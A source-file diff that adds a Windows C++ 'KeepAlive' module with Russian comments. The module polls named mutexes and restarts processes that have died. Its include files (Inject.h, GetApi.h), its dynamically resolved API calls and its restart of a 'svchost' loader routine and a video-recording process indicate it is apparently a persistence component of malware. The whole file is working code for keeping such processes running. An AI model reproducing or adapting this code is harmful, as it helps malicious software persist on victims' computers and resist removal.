@@ -1,0 +1,138 @@
+
+#include <windows.h>
+
+#include"KeepAlive.h"
+#include "GetApi.h"
+#include "Strings.h"
+#include "Utils.h"
+#include "Inject.h"
+#include "Main.h"
+
+//----------------------------------------------------------------------------
+
+const static char Mutex_SVChost[] = {'k', 'p', '_', 's', 'v', 'c', '_', 'm', 't',  0};
+const static char* Mutex_VideoProcess = "kp_videoprocess";
+
+//-----------------------------------------------------------------------------
+
+PCHAR GetKeepAliveMutexName(DWORD Process)
+{
+	// Функция возвращает имя мютекса для необходимого процесса
+	switch (Process) {
+    	case PROCESS_SVCHOST: return (PCHAR)Mutex_SVChost;
+		case PROCESS_VIDEO: return (PCHAR)Mutex_VideoProcess;
+	}
+	return NULL;
+}
+//-----------------------------------------------------------------------------
+
+void KeepAliveRestartProcess(DWORD ProcessNomber)
+{
+	// Функция перезапускает указанный процесс
+	switch (ProcessNomber) {
+		case PROCESS_SVCHOST: RunLoaderRoutine(); /*MegaJump(LoaderRoutine);*/ break; // Перезапускаем свхост
+
+		#ifdef VideoRecorderH
+		case PROCESS_VIDEO: RunVideoProcess(); break;
+		#endif
+	}
+}
+//-----------------------------------------------------------------------------
+
+DWORD KeepAliveCheckProcessThread(LPVOID ProcessNomber)
+{
+	// Поток проверки жизни процесса
+
+	PCHAR MutexName = GetKeepAliveMutexName((DWORD)ProcessNomber);
+	if (MutexName == NULL) return 0;
+
+	// Запускаем бесконечный цикл проверки существования мютекса
+	// отсутствие мютекса означает, что процесс создавший мютекс
+	// "упал" и требует перезапуска
+
+    const static DWORD MinInterval = 60000;
+
+	DWORD FailedCount  = 0; // Количество проваленных попыток открытия мютекса
+	DWORD RestartCount = 0; // Количество перезапусков с интервалом меньше доступного
+	DWORD RestartTime  = 0;  // Время одного перезапуска
+
+
+
+	while (true)
+	{
+		// Открываем мютекс
+		HANDLE Handle = (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS, false, MutexName);
+		if (Handle != NULL)
+		{
+			// Мютекс существует.
+			// Обнуляем счётчик провалов
+		   FailedCount = 0;
+
+           pCloseHandle(Handle);
+		}
+		else
+		{
+			// Мютекс отсутствует, принимаем меры для устранения проблемы
+			FailedCount++;
+
+			if (FailedCount >= 5)
+			{
+				// перезапускаем процесс
+
+				FailedCount = 0;
+				KeepAliveRestartProcess((DWORD)ProcessNomber);
+
+				// Проверяем время рестарта
+				DWORD NewTime = (DWORD)pGetTickCount();
+				if (RestartTime != 0)
+				{
+					if ((NewTime - RestartTime) <= MinInterval)
+					{
+						RestartCount++;
+						if (RestartCount >= 3)
+						{
+							// процесс не стабилен и часто падает.
+							// Во избежание нагрузки на ПК и психику
+							// пользователя прекращаем мониторинг не стабильного
+							// процесса
+							return 0;
+                        }
+					}
+					else
+					{
+						RestartTime  = 0;
+						RestartCount = 0; // Обнуляем счтчик частоты перезапуска
+					}
+				}
+
+				RestartTime = NewTime;
+            }
+		}
+		// Приостанавливаем поток
+        pSleep(2000);
+	}
+}
+//-----------------------------------------------------------------------------
+
+bool KeepAliveInitializeProcess(DWORD ProcessNomber)
+{
+	//  Функция инициализирует систему слежения внутри требуемого
+	//  процесса. Вызывается из процесса за которым будет вестись
+	//  наблюдение
+	PCHAR MutexName = GetKeepAliveMutexName(ProcessNomber);
+	if (MutexName == NULL) return false;
+
+    HANDLE Handle = (HANDLE)pCreateMutexA(NULL, false, MutexName);
+
+    return Handle != NULL;
+}
+//-----------------------------------------------------------------------------
+
+void KeepAliveCheckProcess(DWORD ProcessNomber)
+{
+	//  Функция запускает поток слежения за жизнью указанного процесса
+	//  Вызывается из стороннего процесса
+
+	if (GetKeepAliveMutexName(ProcessNomber) != NULL)
+		StartThread(KeepAliveCheckProcessThread, (LPVOID)ProcessNomber);
+}
